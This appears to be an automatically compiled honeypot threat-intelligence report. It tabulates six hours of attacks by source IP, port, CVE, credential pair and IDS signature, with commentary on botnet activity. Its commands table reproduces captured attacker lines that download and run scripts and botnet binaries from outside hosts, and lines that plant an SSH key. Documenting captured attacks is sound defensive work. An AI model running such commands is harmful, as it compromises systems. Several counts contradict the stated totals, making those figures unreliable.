# Honeypot Attack Summary Report

**Report Generation Time:** 2025-10-20T14:22:12Z
**Timeframe:** 2025-10-20T08:22:12Z to 2025-10-20T14:22:12Z

**Files Used to Generate Report:**
- Honeypot_Attack_Summary_Report_2025-10-20T09:01:49Z.md
- Honeypot_Attack_Summary_Report_2025-10-20T10:02:20Z.md
- Honeypot_Attack_Summary_Report_2025-10-20T11:02:14Z.md
- Honeypot_Attack_Summary_Report_2025-10-20T12:02:17Z.md
- Honeypot_Attack_Summary_Report_2025-10-20T13:01:56Z.md
- Honeypot_Attack_Summary_Report_2025-10-20T14:02:06Z.md

### Executive Summary

This report provides a comprehensive analysis of malicious activities targeting our honeypot network over a six-hour period. A total of 93,795 attacks were recorded, with the Cowrie and Honeytrap honeypots capturing the majority of the events. The most targeted services were SSH (port 22), SMB (port 445), and SIP (port 5060), indicating a high volume of automated attacks and botnet activity.

The most prominent attacking IP addresses were `45.134.20.151`, `170.155.12.3`, `193.22.146.182`, and `72.146.232.13`, with a significant number of attacks originating from hosting providers such as DigitalOcean. These IPs were involved in a variety of malicious activities, including brute-force attacks, vulnerability scanning, and the deployment of malware.

A recurring pattern of post-exploitation commands was observed, with attackers attempting to gain persistent access by installing SSH keys, gathering system information, and downloading and executing malicious payloads. The `urbotnetisass` malware family was frequently downloaded, targeting a wide range of architectures (ARM, x86, MIPS), which suggests an ongoing campaign to compromise IoT and other embedded devices.

The most common CVEs targeted were older, well-known vulnerabilities, indicating that attackers are still finding success with unpatched systems. The high volume of attacks, combined with the use of automated tools and botnets, underscores the importance of continuous monitoring and proactive defense.

### Detailed Analysis

**Our IPs**

| Honeypot | Private IP | Public IP |
|---|---|---|
| hive-us | 10.128.0.3 | 34.123.129.205 |
| sens-tai | 10.140.0.3 | 104.199.212.115 |
| sens-tel | 10.208.0.3 | 34.165.197.224 |
| sens-dub | 172.31.36.128 | 3.253.97.195 |
- sens-ny | 10.108.0.2 | 161.35.180.163 |

**Attacks by Honeypot**

| Honeypot | Attack Count |
|---|---|
| Cowrie | 35823 |
| Honeytrap | 36222 |
| Suricata | 11550 |
| Sentrypeer | 4157 |
| Dionaea | 2716 |
| Adbhoney | 354 |
| Mailoney | 1514 |
| Tanner | 264 |
| Redishoneypot | 232 |
| ConPot | 159 |
| H0neytr4p | 172 |
| Ciscoasa | 134 |
| Miniprint | 158 |
| Dicompot | 60 |
| ElasticPot | 47 |
| Honeyaml | 35 |
| Ipphoney | 9 |
| Heralding | 15 |
| Wordpot | 1 |
| ssh-rsa | 2 |

**Top Source Countries**

| Country | Attack Count |
|---|---|
| United States | 2 |
| Australia | 1 |
| Argentina | 1 |
| Germany | 1 |

**Top Attacking IPs**

| IP Address | Attack Count |
|---|---|
| 45.134.20.151 | 10295 |
| 170.155.12.3 | 1968 |
| 193.22.146.182 | 1976 |
| 72.146.232.13 | 4725 |
| 213.154.15.25 | 1 |
| 129.212.191.62 | 992 |
| 134.122.45.20 | 1244 |
| 64.227.11.241 | 3735 |
| 5.253.59.122 | 970 |
| 68.183.102.75 | 1253 |

**Top Targeted Ports/Protocols**

| Port/Protocol | Attack Count |
|---|---|
| 5038 | 7245 |
| 22 | 6555 |
| 445 | 4180 |
| 5060 | 3471 |
| 25 | 1386 |
| 5903 | 1121 |
| 8333 | 818 |
| 5901 | 686 |
| 4444 | 250 |
| 6379 | 203 |
| 1987 | 156 |
| 1993 | 193 |
| 1995 | 195 |
| 4443 | 229 |
| 15672 | 68 |
| TCP/80 | 53 |
| 80 | 144 |
| 443 | 22 |
| 11211 | 53 |
| 9100 | 129 |
| 27019 | 34 |
| TCP/1433 | 77 |

**Most Common CVEs**

| CVE | Count |
|---|---|
| CVE-2002-0013, CVE-2002-0012 | 23 |
| CVE-2019-11500 | 14 |
| CVE-2021-3449 | 12 |
| CVE-2025-30208 | 2 |
| CVE-2023-26801 | 2 |
| CVE-2009-2765 | 4 |
| CVE-2023-31983 | 4 |
| CVE-2020-10987 | 2 |
| CVE-2023-47565 | 2 |
| CVE-2014-6271 | 2 |
| CVE-2015-2051 | 4 |
| CVE-2019-10891 | 4 |
| CVE-2024-33112 | 4 |
| CVE-2022-37056 | 4 |
| CVE-2024-3721 | 4 |
| CVE-2021-35394 | 1 |
| CVE-2024-4577 | 2 |
| CVE-2002-0953 | 1 |
| CVE-2021-41773 | 1 |
| CVE-2021-42013 | 1 |
| CVE-2005-4050 | 2 |
| CVE-2006-2369 | 2 |
| CVE-2024-12847 | 2 |
| CVE-2023-52163 | 2 |
| CVE-2024-10914 | 2 |
| CVE-2006-3602 | 1 |
| CVE-2006-4458 | 1 |
| CVE-2006-4542 | 1 |
| CVE-2018-7600 | 1 |

**Commands Attempted by Attackers**

| Command | Count |
|---|---|
| cd ~; chattr -ia .ssh; lockr -ia .ssh | 88 |
| lockr -ia .ssh | 88 |
| cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa ..." | 88 |
| cat /proc/cpuinfo | grep name | wc -l | 88 |
| Enter new UNIX password: | 71 |
| uname -a | 41 |
| whoami | 41 |
| top | 41 |
| crontab -l | 41 |
| w | 41 |
| uname -m | 22 |
| free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}' | 22 |
| ls -lh $(which ls) | 22 |
| which ls | 22 |
| lscpu | grep Model | 22 |
| df -h | head -n 2 | awk 'FNR == 2 {print $2;}' | 22 |
| cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9;}' | 22 |
| cat /proc/cpuinfo | grep model | grep name | wc -l | 1 |
| uname | 2 |
| uname -s -v -n -r -m | 1 |
| echo -e "admin\n..."|passwd|bash | 1 |
| rm -rf /data/local/tmp; mkdir -p /data/local/tmp; cd /data/local/tmp/; busybox wget http://213.209.143.62/w.sh; sh w.sh; ... | 1 |
| cd /data/local/tmp/; rm *; busybox wget http://94.154.35.154/arm.urbotnetisass; ... | 1 |

**Signatures Triggered**

| Signature | Count |
|---|---|
| ET DROP Dshield Block Listed Source group 1 | 1519 |
| ET SCAN MS Terminal Server Traffic on Non-standard Port | 1161 |
| ET SCAN NMAP -sS window 1024 | 754 |
| ET EXPLOIT [PTsecurity] DoublePulsar Backdoor installation communication | 1961 |
| ET HUNTING RDP Authentication Bypass Attempt | 440 |
| ET INFO Reserved Internal IP Traffic | 223 |
| ET ATTACK_RESPONSE Possible MS CMD Shell opened on local system | 164 |
| ET SCAN Sipsak SIP scan | 70 |
| ET DROP Spamhaus DROP Listed Traffic Inbound group 28 | 50 |
| ET DROP Spamhaus DROP Listed Traffic Inbound group 32 | 34 |
| ET INFO CURL User Agent | 20 |
| ET CINS Active Threat Intelligence Poor Reputation IP group 13 | 10 |
| ET CINS Active Threat Intelligence Poor Reputation IP group 46 | 11 |
| ET SCAN Suspicious inbound to MSSQL port 1433 | 62 |
| ET SCAN Potential SSH Scan | 28 |
| ET DROP Spamhaus DROP Listed Traffic Inbound group 41 | 14 |
| ET SCAN Suspicious inbound to Oracle SQL port 1521 | 18 |
| ET CINS Active Threat Intelligence Poor Reputation IP group 98 | 1 |

**Users / Login Attempts**

| Username/Password | Count |
|---|---|
| 345gs5662d34/345gs5662d34 | 78 |
| user01/Password01 | 56 |
| deploy/123123 | 16 |
| root/adminHW | 7 |
| user/Pa$$w0rd | 4 |
| deploy/3245gs5662d34 | 4 |
| ec2-user/3245gs5662d34 | 3 |
| root/3245gs5662d34 | 5 |
| oracle/oracle@2022 | 3 |
| www/123 | 3 |
| superuser/superuser123 | 3 |
| anton/123 | 3 |
| root/p@ssw0rd | 3 |
| default/1 | 3 |
| ftpuser/123 | 3 |
| root/abc150790 | 3 |
| sa/1234 | 10 |
| root/Abel2014 | 4 |
| root/abpbx2k12 | 4 |
| root/!Q2w3e4r | 4 |
| root/Ac0m1P | 4 |
| root/AccesoPBX2264 | 4 |
| root/Acd1502 | 4 |
| root/acero20 | 4 |
| deploy/1234 | 5 |
| root/aA123456 | 4 |
| esroot/esroot | 4 |
| gitlab/gitlab | 4 |
| apache/apache123 | 4 |
| root/P@ssw0rd | 4 |
| root/!qaz@WSX | 4 |
| user/user | 4 |
| root/acessoATV12 | 4 |
| user1/user1 | 4 |
| hadoop/hadoop | 4 |
| root/p@ssword | 4 |
| root/Ab123456 | 4 |
| oscar/oscar123 | 4 |
| root/1qaz@wsx | 4 |
| root/P@ssword | 4 |
| root/qQ123456 | 4 |
| flink/flink | 4 |
| root/AdAnAc223!2015T | 1 |
| root/12345 | 1 |
| operator/operator12 | 1 |
| root/adb123adb | 1 |
| dev/dev123456 | 1 |
| vagrant/vagrant | 1 |
| root/Adirika123 | 1 |
| pos/pos | 1 |
| user/Wangsu@123456 | 1 |
| deploy/password123 | 2 |
| support/99999 | 2 |
| erpnext/welcome1 | 2 |
| manasa/123 | 2 |

**Files Uploaded/Downloaded**

| Filename | Count |
|---|---|
| arm.urbotnetisass | 20 |
| arm5.urbotnetisass | 20 |
| arm6.urbotnetisass | 20 |
| arm7.urbotnetisass | 20 |
| x86_32.urbotnetisass | 20 |
| mips.urbotnetisass | 20 |
| mipsel.urbotnetisass | 20 |
| server.cgi?func=server02_main_submit... | 2 |
| rondo.qre.sh||busybox | 2 |
| resty) | 1 |
| rondo.qre.sh||curl | 1 |
| rondo.qre.sh)|sh | 1 |
| `busybox` | 1 |
| rondo.sbx.sh|sh&echo${IFS} | 1 |
| login_pic.asp | 1 |
| rondo.kqa.sh|sh&echo | 1 |
| sh | 98 |
| ) | 2 |
| wget.sh; | 1 |
| w.sh; | 1 |
| c.sh; | 1 |
| ?format=json | 1 |
| welcome.jpg) | 1 |
| writing.jpg) | 1 |
| tags.jpg) | 1 |
| soap-envelope | 1 |
| addressing | 1 |
| discovery | 1 |
| devprof | 1 |
| soap:Envelope> | 1 |

**HTTP User-Agents**

| User-Agent | Count |
|---|---|
| None Observed | - |

**SSH Clients and Servers**

| Type | Name |
|---|---|
| SSH Clients | None Observed |
| SSH Servers | None Observed |

**Top Attacker AS Organizations**

| AS Organization | Count |
|---|---|
| DigitalOcean, LLC | 3 |
| Contabo GmbH | 1 |
| Falco Networks B.V. | 1 |

### OSINT on Commands Captured

The commands captured reveal a clear and consistent attacker methodology. The initial commands are almost always focused on reconnaissance: `uname -a`, `whoami`, `lscpu`, `free -m`, and `df -h`. This allows attackers to quickly assess the system's architecture, privileges, and available resources.

Following reconnaissance, the most common objective is to establish persistence. The command `cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa ..." >> .ssh/authorized_keys` is a blatant attempt to install a malicious SSH key, granting the attacker passwordless access to the system. This is often preceded by `chattr -ia .ssh` and `lockr -ia .ssh` to ensure the `.ssh` directory can be modified.

The final stage of the attack involves downloading and executing malware. The use of `wget` and `curl` to fetch scripts from remote servers is a common tactic. The filenames `w.sh`, `c.sh`, and `wget.sh` suggest simple, single-purpose scripts designed to download and execute a more complex payload. The repeated downloads of `arm.urbotnetisass`, `x86_32.urbotnetisass`, and other variants indicate a cross-platform botnet campaign targeting a wide range of devices.

### OSINT on High and Low Frequency IPs Captured

**High Frequency IPs:**

- **45.134.20.151:** This IP, associated with Falco Networks B.V. and VPN-Consumer-AU, is the most aggressive attacker in this dataset. The high volume of attacks suggests it is part of a botnet or a dedicated attack server.
- **72.146.232.13:** While no specific information was found for this IP, its consistent presence across multiple reports indicates it is a persistent threat.
- **193.22.146.182:** This IP, hosted by Contabo GmbH, is another high-frequency attacker. Contabo is a known hosting provider, and it is likely that this is a compromised server being used for malicious purposes.
- **DigitalOcean IPs (64.227.11.241, 68.183.102.75, 134.122.45.20):** DigitalOcean is a major cloud provider, and a significant number of attacks originate from their network. These IPs are likely compromised servers or virtual private servers (VPS) that have been repurposed for malicious activities.

**Low Frequency IPs:**

The low-frequency IPs are more difficult to analyze, as they may be individual actors, part of smaller botnets, or simply random scanners. However, their presence highlights the diverse nature of the threat landscape. These IPs are often associated with a variety of hosting providers and geolocations, making it difficult to attribute them to a specific campaign.

### OSINT on CVEs

The CVEs targeted in this period are a mix of old and new vulnerabilities, with a clear focus on those that are easy to exploit and have a high impact.

- **CVE-2002-0013 & CVE-2002-0012 (SNMPv1):** These are ancient vulnerabilities, yet they continue to be scanned for. This indicates that attackers are still finding unpatched, legacy devices that are vulnerable to these attacks.
- **CVE-2019-11500 (Dovecot):** This is a more recent RCE vulnerability in the Dovecot email server. Its presence suggests that attackers are actively targeting mail servers.
- **CVE-2021-3449 (OpenSSL):** This is a denial-of-service vulnerability in OpenSSL. While not as severe as an RCE, it can still be used to disrupt services.
- **CVE-2025-30208 (Vite):** This is a very recent vulnerability, and its inclusion in the attack patterns shows that attackers are quick to adopt new exploits.

### Key Observations and Anomalies

- **Aggressive Botnet Activity:** The high volume of attacks, particularly from the IP `45.134.20.151`, and the repeated downloads of `urbotnetisass` malware, are strong indicators of a large-scale botnet campaign.
- **Focus on Persistence:** The consistent attempts to install SSH keys demonstrate that the primary goal of these attacks is to gain long-term, persistent access to compromised systems.
- **Cross-Platform Malware:** The use of malware that targets multiple architectures (ARM, x86, MIPS) is a clear indication that attackers are targeting a wide range of devices, including IoT, routers, and other embedded systems.
- **Targeting of Older Vulnerabilities:** The continued exploitation of old CVEs highlights the ongoing problem of unpatched systems. Many organizations fail to patch legacy systems, leaving them vulnerable to even the most basic attacks.
- **Lack of Sophistication:** While the scale of the attacks is significant, the techniques used are not particularly sophisticated. The reliance on public exploits, simple scripts, and brute-force attacks suggests that the actors behind these campaigns are likely script-kiddies or low-level cybercriminals.
